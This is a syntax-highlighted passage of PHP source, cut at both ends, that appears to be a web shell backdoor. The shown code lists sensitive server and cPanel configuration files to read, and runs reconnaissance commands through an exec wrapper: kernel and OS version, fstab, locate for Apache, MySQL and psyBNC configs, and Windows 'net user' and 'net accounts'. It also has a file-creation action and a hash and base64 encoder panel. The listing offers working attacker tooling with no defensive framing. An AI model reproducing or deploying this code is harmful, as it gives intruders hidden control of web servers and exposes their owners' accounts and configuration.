<span class="lineno">1174</span>     <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">is_windows</span><span class="p">())</span> <span class="p">{</span>
<span class="lineno">1175</span>       <span class="nv">$v</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span>
<span class="lineno">1176</span>           <span class="k">array</span><span class="p">(</span><span class="s2">&quot;User Domains&quot;</span><span class="p">,</span><span class="s2">&quot;/etc/userdomains&quot;</span><span class="p">),</span>
<span class="lineno">1177</span>           <span class="k">array</span><span class="p">(</span><span class="s2">&quot;Cpanel Config&quot;</span><span class="p">,</span><span class="s2">&quot;/var/cpanel/accounting.log&quot;</span><span class="p">),</span>
<span class="lineno">1178</span>           <span class="k">array</span><span class="p">(</span><span class="s2">&quot;Apache Config&quot;</span><span class="p">,</span><span class="s2">&quot;/usr/local/apache/conf/httpd.conf&quot;</span><span class="p">),</span>
<span class="lineno">1179</span>           <span class="k">array</span><span class="p">(</span><span class="s2">&quot;Apache Config&quot;</span><span class="p">,</span><span class="s2">&quot;/etc/httpd.conf&quot;</span><span class="p">),</span>
<span class="lineno">1180</span>           <span class="k">array</span><span class="p">(</span><span class="s2">&quot;Syslog Config&quot;</span><span class="p">,</span><span class="s2">&quot;/etc/syslog.conf&quot;</span><span class="p">),</span>
<span class="lineno">1181</span>           <span class="k">array</span><span class="p">(</span><span class="s2">&quot;Message of The Day&quot;</span><span class="p">,</span><span class="s2">&quot;/etc/motd&quot;</span><span class="p">),</span>
<span class="lineno">1182</span>           <span class="k">array</span><span class="p">(</span><span class="s2">&quot;Hosts&quot;</span><span class="p">,</span><span class="s2">&quot;/etc/hosts&quot;</span><span class="p">)</span>
<span class="lineno">1183</span>       <span class="p">);</span>
<span class="lineno">1184</span>       <span class="nv">$sep</span> <span class="o">=</span> <span class="s2">&quot;/&quot;</span><span class="p">;</span>
<span class="lineno">1185</span>     <span class="p">}</span>
<span class="lineno">1186</span>     <span class="k">else</span> <span class="p">{</span>
<span class="lineno">1187</span>       <span class="nv">$windir</span> <span class="o">=</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s2">&quot;WINDIR&quot;</span><span class="p">];</span>
<span class="lineno">1188</span>       <span class="nv">$etcdir</span> <span class="o">=</span> <span class="nv">$windir</span><span class="o">.</span><span class="s1">&#39;\system32\drivers\etc\\&#39;</span><span class="p">;</span>
<span class="lineno">1189</span>       <span class="nv">$v</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span>
<span class="lineno">1190</span>           <span class="k">array</span><span class="p">(</span><span class="s2">&quot;Hosts&quot;</span><span class="p">,</span><span class="nv">$etcdir</span><span class="o">.</span><span class="s2">&quot;hosts&quot;</span><span class="p">),</span>
<span class="lineno">1191</span>           <span class="k">array</span><span class="p">(</span><span class="s2">&quot;Local Network Map&quot;</span><span class="p">,</span><span class="nv">$etcdir</span><span class="o">.</span><span class="s2">&quot;networks&quot;</span><span class="p">),</span>
<span class="lineno">1192</span>           <span class="k">array</span><span class="p">(</span><span class="s2">&quot;LM Hosts&quot;</span><span class="p">,</span><span class="nv">$etcdir</span><span class="o">.</span><span class="s2">&quot;lmhosts.sam&quot;</span><span class="p">),</span>
<span class="lineno">1193</span>       <span class="p">);</span>
<span class="lineno">1194</span>       <span class="nv">$sep</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="se">\\</span><span class="s2">&quot;</span><span class="p">;</span>
<span class="lineno">1195</span>     <span class="p">}</span>
<span class="lineno">1196</span>     <span class="k">foreach</span> <span class="p">(</span><span class="nv">$v</span> <span class="k">as</span> <span class="nv">$sec_arr</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno">1197</span>       <span class="nv">$sec_f</span> <span class="o">=</span> <span class="nb">substr</span><span class="p">(</span><span class="nb">strrchr</span><span class="p">(</span><span class="nv">$sec_arr</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="nv">$sep</span><span class="p">),</span> <span class="mi">1</span><span class="p">);</span>
<span class="lineno">1198</span>       <span class="nv">$sec_d</span> <span class="o">=</span> <span class="nb">rtrim</span><span class="p">(</span><span class="nv">$sec_arr</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span><span class="nv">$sec_f</span><span class="p">);</span>
<span class="lineno">1199</span>       <span class="nv">$sec_full</span> <span class="o">=</span> <span class="nv">$sec_d</span><span class="o">.</span><span class="nv">$sec_f</span><span class="p">;</span>
<span class="lineno">1200</span>       <span class="nv">$sec_d</span> <span class="o">=</span> <span class="nb">rtrim</span><span class="p">(</span><span class="nv">$sec_d</span><span class="p">,</span><span class="nv">$sep</span><span class="p">);</span>
<span class="lineno">1201</span>       <span class="k">if</span> <span class="p">(</span><span class="nb">file_get_contents</span><span class="p">(</span><span class="nv">$sec_full</span><span class="p">))</span> <span class="p">{</span>
<span class="lineno">1202</span>         <span class="k">echo</span> <span class="s2">&quot;</span><span class="se">\t</span><span class="s2">[ &lt;a href=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=f&amp;f=</span><span class="si">$sec_f</span><span class="s2">&amp;d=&quot;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$sec_d</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;ft=txt</span><span class="se">\&quot;</span><span class="s2">&gt;&lt;b&gt;&quot;</span><span class="o">.</span><span class="nv">$sec_arr</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&lt;/b&gt;&lt;/a&gt; ]</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
<span class="lineno">1203</span>       <span class="p">}</span>
<span class="lineno">1204</span>     <span class="p">}</span>
<span class="lineno">1205</span> <span class="cp">?&gt;</span><span class="x"></span>
<span class="lineno">1206</span> 
<span class="lineno">1207</span> 
<span class="lineno">1208</span> <span class="x">    &lt;/td&gt;&lt;/tr&gt;</span>
<span class="lineno">1209</span> <span class="cp">&lt;?php</span>
<span class="lineno">1210</span>     <span class="k">function</span> <span class="nf">dispsecinfo</span><span class="p">(</span><span class="nv">$name</span><span class="p">,</span><span class="nv">$value</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno">1211</span>       <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$value</span><span class="p">))</span> <span class="p">{</span>
<span class="lineno">1212</span>         <span class="k">echo</span> <span class="s2">&quot;</span><span class="se">\t</span><span class="s2">&lt;tr&gt;&lt;td&gt;&quot;</span><span class="o">.</span><span class="nv">$name</span><span class="o">.</span><span class="s2">&quot;&lt;/td&gt;&lt;td&gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="o">.</span>
<span class="lineno">1213</span>             <span class="s2">&quot;&lt;pre&gt;&quot;</span><span class="o">.</span><span class="nb">wordwrap</span><span class="p">(</span><span class="nv">$value</span><span class="p">,</span><span class="mi">100</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&lt;/pre&gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="o">.</span>
<span class="lineno">1214</span>             <span class="s2">&quot;</span><span class="se">\t</span><span class="s2">&lt;/td&gt;&lt;/tr&gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
<span class="lineno">1215</span>       <span class="p">}</span>
<span class="lineno">1216</span>     <span class="p">}</span>
<span class="lineno">1217</span>     <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">is_windows</span><span class="p">())</span> <span class="p">{</span>
<span class="lineno">1218</span>       <span class="nx">dispsecinfo</span><span class="p">(</span><span class="s2">&quot;OS Version&quot;</span><span class="p">,</span><span class="nx">fx29exec</span><span class="p">(</span><span class="s2">&quot;cat /proc/version&quot;</span><span class="p">));</span>
<span class="lineno">1219</span>       <span class="nx">dispsecinfo</span><span class="p">(</span><span class="s2">&quot;Kernel Version&quot;</span><span class="p">,</span><span class="nx">fx29exec</span><span class="p">(</span><span class="s2">&quot;sysctl -a | grep version&quot;</span><span class="p">));</span>
<span class="lineno">1220</span>       <span class="nx">dispsecinfo</span><span class="p">(</span><span class="s2">&quot;Distrib Name&quot;</span><span class="p">,</span><span class="nx">fx29exec</span><span class="p">(</span><span class="s2">&quot;cat /etc/issue.net&quot;</span><span class="p">));</span>
<span class="lineno">1221</span>       <span class="nx">dispsecinfo</span><span class="p">(</span><span class="s2">&quot;Distrib Name (2)&quot;</span><span class="p">,</span><span class="nx">fx29exec</span><span class="p">(</span><span class="s2">&quot;cat /etc/*-realise&quot;</span><span class="p">));</span>
<span class="lineno">1222</span>       <span class="nx">dispsecinfo</span><span class="p">(</span><span class="s2">&quot;CPU Info&quot;</span><span class="p">,</span><span class="nx">fx29exec</span><span class="p">(</span><span class="s2">&quot;cat /proc/cpuinfo&quot;</span><span class="p">));</span>
<span class="lineno">1223</span>       <span class="nx">dispsecinfo</span><span class="p">(</span><span class="s2">&quot;RAM&quot;</span><span class="p">,</span><span class="nx">fx29exec</span><span class="p">(</span><span class="s2">&quot;free -m&quot;</span><span class="p">));</span>
<span class="lineno">1224</span>       <span class="nx">dispsecinfo</span><span class="p">(</span><span class="s2">&quot;HDD Space&quot;</span><span class="p">,</span><span class="nx">fx29exec</span><span class="p">(</span><span class="s2">&quot;df -h&quot;</span><span class="p">));</span>
<span class="lineno">1225</span>       <span class="nx">dispsecinfo</span><span class="p">(</span><span class="s2">&quot;List of Attributes&quot;</span><span class="p">,</span><span class="nx">fx29exec</span><span class="p">(</span><span class="s2">&quot;lsattr -a&quot;</span><span class="p">));</span>
<span class="lineno">1226</span>       <span class="nx">dispsecinfo</span><span class="p">(</span><span class="s2">&quot;Mount Options&quot;</span><span class="p">,</span><span class="nx">fx29exec</span><span class="p">(</span><span class="s2">&quot;cat /etc/fstab&quot;</span><span class="p">));</span>
<span class="lineno">1227</span>       <span class="nx">dispsecinfo</span><span class="p">(</span><span class="s2">&quot;lynx installed?&quot;</span><span class="p">,</span><span class="nx">fx29exec</span><span class="p">(</span><span class="s2">&quot;which lynx&quot;</span><span class="p">));</span>
<span class="lineno">1228</span>       <span class="nx">dispsecinfo</span><span class="p">(</span><span class="s2">&quot;links installed?&quot;</span><span class="p">,</span><span class="nx">fx29exec</span><span class="p">(</span><span class="s2">&quot;which links&quot;</span><span class="p">));</span>
<span class="lineno">1229</span>       <span class="nx">dispsecinfo</span><span class="p">(</span><span class="s2">&quot;GET installed?&quot;</span><span class="p">,</span><span class="nx">fx29exec</span><span class="p">(</span><span class="s2">&quot;which GET&quot;</span><span class="p">));</span>
<span class="lineno">1230</span>       <span class="nx">dispsecinfo</span><span class="p">(</span><span class="s2">&quot;Where is Apache?&quot;</span><span class="p">,</span><span class="nx">fx29exec</span><span class="p">(</span><span class="s2">&quot;whereis apache&quot;</span><span class="p">));</span>
<span class="lineno">1231</span>       <span class="nx">dispsecinfo</span><span class="p">(</span><span class="s2">&quot;Where is perl?&quot;</span><span class="p">,</span><span class="nx">fx29exec</span><span class="p">(</span><span class="s2">&quot;whereis perl&quot;</span><span class="p">));</span>
<span class="lineno">1232</span>       <span class="nx">dispsecinfo</span><span class="p">(</span><span class="s2">&quot;Locate proftpd.conf&quot;</span><span class="p">,</span><span class="nx">fx29exec</span><span class="p">(</span><span class="s2">&quot;locate proftpd.conf&quot;</span><span class="p">));</span>
<span class="lineno">1233</span>       <span class="nx">dispsecinfo</span><span class="p">(</span><span class="s2">&quot;Locate httpd.conf&quot;</span><span class="p">,</span><span class="nx">fx29exec</span><span class="p">(</span><span class="s2">&quot;locate httpd.conf&quot;</span><span class="p">));</span>
<span class="lineno">1234</span>       <span class="nx">dispsecinfo</span><span class="p">(</span><span class="s2">&quot;Locate my.conf&quot;</span><span class="p">,</span><span class="nx">fx29exec</span><span class="p">(</span><span class="s2">&quot;locate my.conf&quot;</span><span class="p">));</span>
<span class="lineno">1235</span>       <span class="nx">dispsecinfo</span><span class="p">(</span><span class="s2">&quot;Locate psybnc.conf&quot;</span><span class="p">,</span><span class="nx">fx29exec</span><span class="p">(</span><span class="s2">&quot;locate psybnc.conf&quot;</span><span class="p">));</span>
<span class="lineno">1236</span>     <span class="p">}</span>
<span class="lineno">1237</span>     <span class="k">else</span> <span class="p">{</span>
<span class="lineno">1238</span>       <span class="nx">dispsecinfo</span><span class="p">(</span><span class="s2">&quot;OS Version&quot;</span><span class="p">,</span><span class="nx">fx29exec</span><span class="p">(</span><span class="s2">&quot;ver&quot;</span><span class="p">));</span>
<span class="lineno">1239</span>       <span class="nx">dispsecinfo</span><span class="p">(</span><span class="s2">&quot;Account Settings&quot;</span><span class="p">,</span><span class="nx">fx29exec</span><span class="p">(</span><span class="s2">&quot;net accounts&quot;</span><span class="p">));</span>
<span class="lineno">1240</span>       <span class="nx">dispsecinfo</span><span class="p">(</span><span class="s2">&quot;User Accounts&quot;</span><span class="p">,</span><span class="nx">fx29exec</span><span class="p">(</span><span class="s2">&quot;net user&quot;</span><span class="p">));</span>
<span class="lineno">1241</span>     <span class="p">}</span>
<span class="lineno">1242</span>     <span class="k">echo</span> <span class="s2">&quot;&lt;/table&gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
<span class="lineno">1243</span>   <span class="p">}</span>
<span class="lineno">1244</span>   <span class="c1">###[ MAKE FILE ]###</span>
<span class="lineno">1245</span>   <span class="k">if</span> <span class="p">(</span><span class="nv">$act</span> <span class="o">==</span> <span class="s2">&quot;mkfile&quot;</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno">1246</span>     <span class="k">if</span> <span class="p">(</span><span class="nv">$mkfile</span> <span class="o">!=</span> <span class="nv">$d</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno">1247</span>       <span class="k">if</span> <span class="p">(</span><span class="nv">$overwrite</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno">1248</span>         <span class="k">if</span> <span class="p">(</span><span class="nb">file_exists</span><span class="p">(</span><span class="nv">$mkfile</span><span class="p">))</span> <span class="p">{</span> <span class="k">echo</span> <span class="s2">&quot;&lt;b&gt;FILE EXIST:&lt;/b&gt; </span><span class="si">$overwrite</span><span class="s2"> &quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$mkfile</span><span class="p">);</span> <span class="p">}</span>
<span class="lineno">1249</span>       <span class="p">}</span>
<span class="lineno">1250</span>       <span class="k">else</span> <span class="p">{</span>
<span class="lineno">1251</span>         <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">fopen</span><span class="p">(</span><span class="nv">$mkfile</span><span class="p">,</span><span class="s2">&quot;w&quot;</span><span class="p">))</span> <span class="p">{</span> <span class="k">echo</span> <span class="s2">&quot;&lt;b&gt;ACCESS DENIED:&lt;/b&gt; &quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$mkfile</span><span class="p">);</span> <span class="p">}</span>
<span class="lineno">1252</span>         <span class="k">else</span> <span class="p">{</span> <span class="nv">$act</span> <span class="o">=</span> <span class="s2">&quot;f&quot;</span><span class="p">;</span> <span class="nv">$d</span> <span class="o">=</span> <span class="nb">dirname</span><span class="p">(</span><span class="nv">$mkfile</span><span class="p">);</span> <span class="k">if</span> <span class="p">(</span><span class="nb">substr</span><span class="p">(</span><span class="nv">$d</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="o">!=</span> <span class="nx">DIRECTORY_SEPARATOR</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno">1253</span>                   <span class="nv">$d</span> <span class="o">.=</span> <span class="nx">DIRECTORY_SEPARATOR</span><span class="p">;</span>
<span class="lineno">1254</span>                     <span class="p">}</span>
<span class="lineno">1255</span>                     <span class="nv">$f</span> <span class="o">=</span> <span class="nb">basename</span><span class="p">(</span><span class="nv">$mkfile</span><span class="p">);</span>
<span class="lineno">1256</span>                 <span class="p">}</span>
<span class="lineno">1257</span>       <span class="p">}</span>
<span class="lineno">1258</span>     <span class="p">}</span>
<span class="lineno">1259</span>     <span class="k">else</span> <span class="p">{</span> <span class="nx">disp_error</span><span class="p">(</span><span class="s2">&quot;Enter filename!&quot;</span><span class="p">);</span> <span class="p">}</span>
<span class="lineno">1260</span>   <span class="p">}</span>
<span class="lineno">1261</span>   <span class="c1">###[ ENCODER ]###</span>
<span class="lineno">1262</span>   <span class="k">if</span> <span class="p">(</span><span class="nv">$act</span> <span class="o">==</span> <span class="s2">&quot;encoder&quot;</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno">1263</span>     <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$encoder_input</span><span class="p">))</span> <span class="p">{</span> <span class="nv">$encoder_input</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span> <span class="p">}</span>
<span class="lineno">1264</span> <span class="cp">?&gt;</span><span class="x"></span>
<span class="lineno">1265</span> 
<span class="lineno">1266</span> 
<span class="lineno">1267</span> <span class="x">&lt;script language=&quot;javascript&quot;&gt; function set_encoder_input(text) { document.forms.encoder.input.value = text; }&lt;/script&gt;</span>
<span class="lineno">1268</span> <span class="x">&lt;form name=&quot;encoder&quot; action=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$surl</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x">&quot; method=POST&gt;</span>
<span class="lineno">1269</span> <span class="x">    &lt;input type=&quot;hidden&quot; name=&quot;act&quot; value=&quot;encoder&quot;&gt;</span>
<span class="lineno">1270</span> <span class="x">    &lt;table class=&quot;contents&quot;&gt;</span>
<span class="lineno">1271</span> <span class="x">        &lt;tr&gt;&lt;td colspan=&quot;4&quot; class=&quot;barheader&quot;&gt;.: Encoder :.&lt;/td&gt;&lt;/tr&gt;</span>
<span class="lineno">1272</span> <span class="x">        &lt;tr&gt;&lt;td colspan=&quot;2&quot;&gt;Input:&lt;/td&gt;&lt;td&gt;&lt;textarea name=&quot;encoder_input&quot; id=&quot;input&quot; cols=&quot;70&quot; rows=&quot;5&quot;&gt;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="o">@</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$encoder_input</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="x">&lt;/textarea&gt;&lt;br&gt;</span>
<span class="lineno">1273</span> <span class="x">        &lt;input type=&quot;submit&quot; value=&quot;Calculate&quot;&gt;</span>
<span class="lineno">1274</span> <span class="x">        &lt;/td&gt;&lt;/tr&gt;</span>
<span class="lineno">1275</span> <span class="x">        &lt;tr&gt;&lt;td rowspan=&quot;4&quot;&gt;Hashes:&lt;/td&gt;</span>
<span class="lineno">1276</span> <span class="cp">&lt;?php</span>
<span class="lineno">1277</span>     <span class="k">foreach</span><span class="p">(</span><span class="k">array</span><span class="p">(</span><span class="s2">&quot;md5&quot;</span><span class="p">,</span><span class="s2">&quot;crypt&quot;</span><span class="p">,</span><span class="s2">&quot;sha1&quot;</span><span class="p">,</span><span class="s2">&quot;crc32&quot;</span><span class="p">)</span> <span class="k">as</span> <span class="nv">$v</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno">1278</span> <span class="cp">?&gt;</span><span class="x"></span>
<span class="lineno">1279</span> 
<span class="lineno">1280</span> 
<span class="lineno">1281</span> <span class="x">        &lt;td&gt;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$v</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x">:&lt;/td&gt;&lt;td&gt;&lt;input type=&quot;text&quot; size=&quot;50&quot; onFocus=&quot;this.select()&quot; onMouseover=&quot;this.select()&quot; onMouseout=&quot;this.select()&quot; value=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$v</span><span class="p">(</span><span class="nv">$encoder_input</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="x">&quot; readonly&gt;</span>
<span class="lineno">1282</span> <span class="x">        &lt;/td&gt;&lt;/tr&gt;</span>
<span class="lineno">1283</span> <span class="x">        &lt;tr&gt;</span>
<span class="lineno">1284</span> <span class="cp">&lt;?php</span>
<span class="lineno">1285</span>     <span class="p">}</span>
<span class="lineno">1286</span> <span class="cp">?&gt;</span><span class="x"></span>
<span class="lineno">1287</span> 
<span class="lineno">1288</span> 
<span class="lineno">1289</span> <span class="x">        &lt;/tr&gt;</span>
<span class="lineno">1290</span> <span class="x">        &lt;tr&gt;&lt;td rowspan=2&gt;Url:&lt;/td&gt;</span>
<span class="lineno">1291</span> <span class="x">        &lt;td&gt;urlencode:&lt;/td&gt;&lt;td&gt;&lt;input type=&quot;text&quot; size=&quot;35&quot; onFocus=&quot;this.select()&quot; onMouseover=&quot;this.select()&quot; onMouseout=&quot;this.select()&quot; value=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nb">urlencode</span><span class="p">(</span><span class="nv">$encoder_input</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="x">&quot; readonly&gt;</span>
<span class="lineno">1292</span> <span class="x">        &lt;/td&gt;&lt;/tr&gt;</span>
<span class="lineno">1293</span> <span class="x">        &lt;tr&gt;&lt;td&gt;urldecode:&lt;/td&gt;&lt;td&gt;&lt;input type=&quot;text&quot; size=&quot;35&quot; onFocus=&quot;this.select()&quot; onMouseover=&quot;this.select()&quot; onMouseout=&quot;this.select()&quot; value=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nb">urldecode</span><span class="p">(</span><span class="nv">$encoder_input</span><span class="p">));</span> <span class="cp">?&gt;</span><span class="x">&quot; readonly&gt;</span>
<span class="lineno">1294</span> <span class="x">        &lt;/td&gt;&lt;/tr&gt;</span>
<span class="lineno">1295</span> <span class="x">        &lt;tr&gt;&lt;td rowspan=2&gt;Base64:&lt;/td&gt;</span>
<span class="lineno">1296</span> <span class="x">        &lt;td&gt;base64_encode:&lt;/td&gt;&lt;td&gt;&lt;input type=&quot;text&quot; size=&quot;35&quot; onFocus=&quot;this.select()&quot; onMouseover=&quot;this.select()&quot; onMouseout=&quot;this.select()&quot; value=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nb">base64_encode</span><span class="p">(</span><span class="nv">$encoder_input</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="x">&quot; readonly&gt;</span>
<span class="lineno">1297</span> <span class="x">        &lt;/td&gt;&lt;/tr&gt;</span>
<span class="lineno">1298</span> <span class="x">        &lt;tr&gt;&lt;td&gt;base64_decode:&lt;/td&gt;</span>
<span class="lineno">1299</span> <span class="x">        &lt;td&gt;</span>
<span class="lineno">1300</span> <span class="cp">&lt;?php</span>
<span class="lineno">1301</span>     <span class="k">if</span> <span class="p">(</span><span class="nb">base64_encode</span><span class="p">(</span><span class="nb">base64_decode</span><span class="p">(</span><span class="nv">$encoder_input</span><span class="p">))</span> <span class="o">!=</span> <span class="nv">$encoder_input</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno">1302</span> <span class="cp">?&gt;</span><span class="x"></span>
<span class="lineno">1303</span> 
<span class="lineno">1304</span> 
<span class="lineno">1305</span> <span class="x">        &lt;input type=&quot;text&quot; size=&quot;35&quot; value=&quot;Failed!&quot; disabled readonly&gt;</span>
<span class="lineno">1306</span> <span class="cp">&lt;?php</span>
<span class="lineno">1307</span>     <span class="p">}</span>
<span class="lineno">1308</span>     <span class="k">else</span> <span class="p">{</span>
<span class="lineno">1309</span>       <span class="nv">$debase64</span> <span class="o">=</span> <span class="nb">base64_decode</span><span class="p">(</span><span class="nv">$encoder_input</span><span class="p">);</span>
<span class="lineno">1310</span>       <span class="nv">$debase64</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;&amp;#92;&amp;#48;&quot;</span><span class="p">,</span><span class="s2">&quot;[0]&quot;</span><span class="p">,</span><span class="nv">$debase64</span><span class="p">);</span>
<span class="lineno">1311</span>       <span class="nv">$a</span> <span class="o">=</span> <span class="nb">explode</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\r\n</span><span class="s2">&quot;</span><span class="p">,</span><span class="nv">$debase64</span><span class="p">);</span>
<span class="lineno">1312</span>       <span class="nv">$rows</span> <span class="o">=</span> <span class="nb">count</span><span class="p">(</span><span class="nv">$a</span><span class="p">);</span>
<span class="lineno">1313</span>       <span class="nv">$debase64</span> <span class="o">=</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$debase64</span><span class="p">);</span>
<span class="lineno">1314</span>       <span class="k">if</span> <span class="p">(</span><span class="nv">$rows</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno">1315</span>         <span class="k">echo</span> <span class="s2">&quot;</span><span class="se">\t\t</span><span class="s2">&lt;input type=text size=35 onFocus=</span><span class="se">\&quot;</span><span class="s2">this.select()</span><span class="se">\&quot;</span><span class="s2"> onMouseover=</span><span class="se">\&quot;</span><span class="s2">this.select()</span><span class="se">\&quot;</span><span class="s2"> onMouseout=</span><span class="se">\&quot;</span><span class="s2">this.select()</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$debase64</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2"> id=</span><span class="se">\&quot;</span><span class="s2">debase64</span><span class="se">\&quot;</span><span class="s2"> readonly&gt;&quot;</span><span class="p">;</span>
<span class="lineno">1316</span>       <span class="p">}</span>
<span class="lineno">1317</span>       <span class="k">else</span> <span class="p">{</span>
<span class="lineno">1318</span>         <span class="nv">$rows</span><span class="o">++</span><span class="p">;</span>
<span class="lineno">1319</span>         <span class="k">echo</span> <span class="s2">&quot;&lt;textarea cols=</span><span class="se">\&quot;</span><span class="s2">40</span><span class="se">\&quot;</span><span class="s2"> rows=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$rows</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2"> onFocus=</span><span class="se">\&quot;</span><span class="s2">this.select()</span><span class="se">\&quot;</span><span class="s2"> onMouseover=</span><span class="se">\&quot;</span><span class="s2">this.select()</span><span class="se">\&quot;</span><span class="s2"> onMouseout=</span><span class="se">\&quot;</span><span class="s2">this.select()</span><span class="se">\&quot;</span><span class="s2"> id=</span><span class="se">\&quot;</span><span class="s2">debase64</span><span class="se">\&quot;</span><span class="s2"> readonly&gt;&quot;</span><span class="o">.</span><span class="nv">$debase64</span><span class="o">.</span><span class="s2">&quot;&lt;/textarea&gt;&quot;</span><span class="p">;</span>
<span class="lineno">1320</span>       <span class="p">}</span>
<span class="lineno">1321</span>       <span class="k">echo</span> <span class="s2">&quot; &lt;a href=</span><span class="se">\&quot;</span><span class="s2">#</span><span class="se">\&quot;</span><span class="s2"> onclick=</span><span class="se">\&quot;</span><span class="s2">set_encoder_input(document.forms.encoder.debase64.value)</span><span class="se">\&quot;</span><span class="s2">&gt;[Send to input]&lt;/a&gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
<span class="lineno">1322</span>     <span class="p">}</span>
<span class="lineno">1323</span>     <span class="k">echo</span> <span class="s2">&quot;</span><span class="se">\t\t</span><span class="s2">&lt;/td&gt;&lt;/tr&gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="o">.</span>
<span class="lineno">1324</span>          <span class="s2">&quot;</span><span class="se">\t\t</span><span class="s2">&lt;tr&gt;&lt;td&gt;Base convertations:&lt;/td&gt;&lt;td&gt;dec2hex&lt;/td&gt;&lt;td&gt;&quot;</span><span class="o">.</span>
<span class="lineno">1325</span>          <span class="s2">&quot;&lt;input type=</span><span class="se">\&quot;</span><span class="s2">text</span><span class="se">\&quot;</span><span class="s2"> size=</span><span class="se">\&quot;</span><span class="s2">35</span><span class="se">\&quot;</span><span class="s2"> onFocus=</span><span class="se">\&quot;</span><span class="s2">this.select()</span><span class="se">\&quot;</span><span class="s2"> onMouseover=</span><span class="se">\&quot;</span><span class="s2">this.select()</span><span class="se">\&quot;</span><span class="s2"> onMouseout=</span><span class="se">\&quot;</span><span class="s2">this.select()</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;\&quot;</span><span class="s2">&quot;</span><span class="p">;</span>
<span class="lineno">1326</span>     <span class="nv">$c</span> <span class="o">=</span> <span class="nb">strlen</span><span class="p">(</span><span class="nv">$encoder_input</span><span class="p">);</span>
<span class="lineno">1327</span>     <span class="k">for</span> <span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nv">$i</span><span class="o">&lt;</span><span class="nv">$c</span><span class="p">;</span><span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno">1328</span>       <span class="nv">$hex</span> <span class="o">=</span> <span class="nb">dechex</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="nv">$encoder_input</span><span class="p">[</span><span class="nv">$i</span><span class="p">]));</span>
<span class="lineno">1329</span>       <span class="k">if</span> <span class="p">(</span><span class="nv">$encoder_input</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&quot;&amp;&quot;</span><span class="p">)</span> <span class="p">{</span> <span class="k">echo</span> <span class="nv">$encoder_input</span><span class="p">[</span><span class="nv">$i</span><span class="p">];</span> <span class="p">}</span>
